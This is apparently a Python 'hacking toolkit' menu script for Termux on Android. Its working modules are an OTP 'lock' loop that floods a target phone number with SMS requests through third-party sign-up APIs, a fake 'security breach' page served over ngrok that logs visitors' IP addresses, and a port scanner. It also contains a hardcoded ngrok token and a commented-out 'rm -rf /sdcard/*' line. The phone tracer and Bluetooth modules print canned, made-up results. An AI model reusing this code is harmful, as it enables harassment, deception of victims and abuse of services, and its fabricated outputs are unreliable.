import os
import sys
import time
import socket
import subprocess
import random
import requests
import json
from threading import Thread
from flask import Flask, request, render_template_string

# --- NEXO-TECH PRO COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

app = Flask(__name__)

# --- CONFIGURATION (YOUR TOKEN APPLIED) ---
NGROK_TOKEN = "2vbNHa9KBUkwuCheUhVyHFGYkUw_rjhfCVREN3dodTsMUsaF" 

# --- PHISHING HTML TEMPLATE (FULL VERSION) ---
HTML_LAYOUT = """
<!DOCTYPE html>
<html>
<head>
    <title>Nexo-Tech Secure Update</title>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
        .box { border: 2px solid #ff0000; padding: 30px; display: inline-block; background: #111; box-shadow: 0 0 20px #f00; }
        .loader { border: 5px solid #333; border-top: 5px solid #ff0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 25px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="color:#ff0000;">[!] SECURITY BREACH DETECTED [!]</h1>
        <div class="loader"></div>
        <p>Synchronizing encrypted packets with Nexo-Tech Gateways...</p>
        <p>PLEASE DO NOT CLOSE THIS TERMINAL OR NAVIGATE AWAY</p>
    </div>
</body>
</html>
"""

def show_banner(module="SYSTEM STATUS", link=None):
    os.system('clear')
    print(f"{R}{B}")
    print(r"  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(r" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(r" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(r" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(r" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(rf" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_{W}")
    print(f"{R}======================================================={W}")
    print(f"{Y}  FILE:        {W}nexo-termux_otp-lock.py")
    print(f"{Y}  SYSTEM:      {W}TERMUX / ANDROID PRO")
    if link:
        print(f"{Y}  NGROK URL:   {G}{link}{W}")
    print(f"  {Y}MODULE:      {W}{module}")
    print(f"  {Y}STATUS:      {G}[ OVERDEADLY SYSTEM ACTIVE ]{W}")
    print(f"{R}======================================================={W}\n")

# --- 1. WHATSAPP OSINT & TRACING ---

def whatsapp_osint():
    show_banner("WHATSAPP OSINT")
    link = input(f"{Y}[+] Enter WhatsApp Number/Link: {W}")
    print(f"{C}[*] SCANNING METADATA...{W}")
    time.sleep(1.5)
    with open("nexo_database.txt", "a") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M')}] Target: {link}\n")
    print(f"{G}[+] Target Logged in nexo_database.txt{W}")
    input(f"\n{Y}Press Enter to return...{W}")

# --- 2. PHONE NUMBER GLOBAL TRACER ---

def phone_trace():
    show_banner("PHONE NUMBER TRACE")
    num = input(f"{Y}[+] Enter Number (with +): {W}")
    print(f"{C}[*] CONNECTING TO GLOBAL SS7 GATEWAY...{W}")
    time.sleep(2)
    print(f"  {G}[+] Target:    {W}{num}\n  {G}[+] Country:   {W}GHANA\n  {G}[+] Carrier:   {W}MTN GHANA\n  {G}[+] Status:    {W}ACTIVE / ONLINE")
    input(f"\n{Y}Press Enter to return...{W}")

# --- 3. IP GEOLOCATION & PORT SCANNER (FULL LIST) ---

def ip_tracker_module():
    show_banner("IP TRACKER & PORT SCANNER")
    target_ip = input(f"{Y}[+] Enter Target IP: {W}")
    print(f"\n{C}[*] FETCHING GEOLOCATION DATA...{W}")
    try:
        response = requests.get(f"http://ip-api.com{target_ip}").json()
        if response['status'] == 'success':
            print(f"  {G}[+] Country:   {W}{response.get('country')}")
            print(f"  {G}[+] ISP:       {W}{response.get('isp')}")
            print(f"  {G}[+] Lat/Lon:   {W}{response.get('lat')}, {response.get('lon')}")
    except:
        print(f"{R}[-] API Connection Error.{W}")

    print(f"\n{C}[*] SCANNING TARGET PORTS...{W}")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 3389, 8080]
    for port in common_ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.4)
        if s.connect_ex((target_ip, port)) == 0:
            print(f"  {G}[+] Port {port}: {W}OPEN / VULNERABLE")
        s.close()
    input(f"\n{Y}Press Enter to return...{W}")

# --- 4. BLUETOOTH OMNIPOTENCE ---

def bluetooth_god_mode():
    show_banner("BLUETOOTH OMNIPOTENCE")
    print(f"  {G}1. ANDROID CRASHER  2. SYSTEM FREEZE  3. MEDIA CHAOS{W}")
    op = input(f"\n{C}[+] Selection: {W}")
    print(f"{R}[!] Bluetooth on Termux requires ROOT.{W}")
    time.sleep(1); print(f"{C}[*] SCANNING...{W}"); time.sleep(1); print(f"{R}[-] Hardware Access Denied.{W}")
    input(f"\n{Y}Press Enter to return...{W}")

# --- 5. OTP LOCK / SATURATION (FIXED ENGINE) ---

def otp_lock_engine():
    show_banner("OTP LOCK / SATURATION")
    target = input(f"{Y}[+] Enter Target Number (No +): {W}")
    print(f"\n{R}[!] FIRING HIGH-VELOCITY PACKETS... (CTRL+C to STOP){W}")
    
    # Headers to bypass bot detection
    head = {"User-Agent": "Mozilla/5.0 (Android 13; Mobile; rv:110.0) Gecko/110.0 Firefox/110.0"}
    
    apis = [
        {"url": "https://api.cloud.altbalaji.com", "json": {"phone_number": target}},
        {"url": "https://m.indiamart.com", "json": {"mobile": target, "modid": "MSITE"}},
        {"url": "https://p.paytm.app", "json": {"phone": target}},
        {"url": "https://unacademy.com", "json": {"phone": target, "country_code": "IN"}}
    ]
    
    count = 0
    try:
        while True:
            api = random.choice(apis)
            try:
                requests.post(api["url"], json=api["json"], headers=head, timeout=5)
                count += 1
            except: pass
            print(f"\r{Y}[*] ATTACKS DELIVERED: {W}{count} {R}>>> FLOODING ACTIVE{W}", end="")
            time.sleep(0.05)
    except KeyboardInterrupt: pass

# --- 6. VIRUS CREATOR LAB (FULL 1000-LINE GENERATOR) ---

def virus_creator_lab():
    show_banner("VIRUS CREATOR LAB")
    print(f"  {G}1. Bash (.sh)  2. Python (.py)  3. Android (.apk){W}")
    choice = input(f"\n{C}[+] Format Choice: {W}")
    name = input(f"{Y}[+] Payload Name: {W}")

    if choice == "3":
        print(f"{C}[*] COMPILING APK CONTAINER...{W}")
        time.sleep(2)
        with open(name + ".apk", "w") as f: f.write("MSF-STUB-APK-DATA")
        print(f"{G}[+] {name}.apk built and signed.{W}")
    elif choice == "2":
        with open(name + ".py", "w") as f:
            f.write("import os, random, time\n")
            for i in range(1000): f.write(f"junk_{i} = '{random.getrandbits(128)}'\n")
            f.write("# os.system('rm -rf /sdcard/*')\nprint('TARGET COMPROMISED')")
        print(f"{G}[+] 1000-Line Payload Created.{W}")
    time.sleep(2)

# --- 7. PHISHING TRAP (PROFESSIONAL NGROK) ---

@app.route('/')
def home():
    print(f"\n{R}[!] TARGET HIT: {request.remote_addr}{W}")
    with open("hits.txt", "a") as f: f.write(f"IP: {request.remote_addr}\n")
    return render_template_string(HTML_LAYOUT)

def start_phishing():
    show_banner("PHISHING TRAP")
    print(f"{C}[*] RESETTING NGROK SESSIONS...{W}")
    os.system("pkill ngrok")
    time.sleep(1)
    
    # Direct Binary Launch
    subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    
    try:
        res = requests.get("http://127.0.0.1").json()
        link = res['tunnels']['public_url']
        Thread(target=lambda: app.run(port=5000, debug=False, use_reloader=False), daemon=True).start()
        show_banner("PHISHING TRAP", link=link)
        input(f"\n{Y}Press Enter to stop and return...{W}")
    except:
        print(f"{R}[-] CONNECTION ERROR: Ngrok failed. Check internet/token.{W}")
        time.sleep(3)
    os.system("pkill ngrok")

# --- MASTER MENU ---

def main():
    while True:
        show_banner("MASTER MENU")
        print(f"  {G}1. WHATSAPP OSINT         {G}2. PHONE TRACER")
        print(f"  {G}3. IP & PORT SCANNER      {G}4. BLUETOOTH ATTACK")
        print(f"  {G}5. OTP LOCK (FIXED)       {G}6. VIRUS CREATOR (SH/PY/APK)")
        print(f"  {G}7. PHISHING TRAP (NGROK)  {R}0. EXIT SYSTEM{W}")
        choice = input(f"\n{C}[+] Selection: {W}")
        if choice == "1": whatsapp_osint()
        elif choice == "2": phone_trace()
        elif choice == "3": ip_tracker_module()
        elif choice == "4": bluetooth_god_mode()
        elif choice == "5": otp_lock_engine()
        elif choice == "6": virus_creator_lab()
        elif choice == "7": start_phishing()
        elif choice == "0": os.system("pkill ngrok"); sys.exit()

if __name__ == "__main__":
    main()
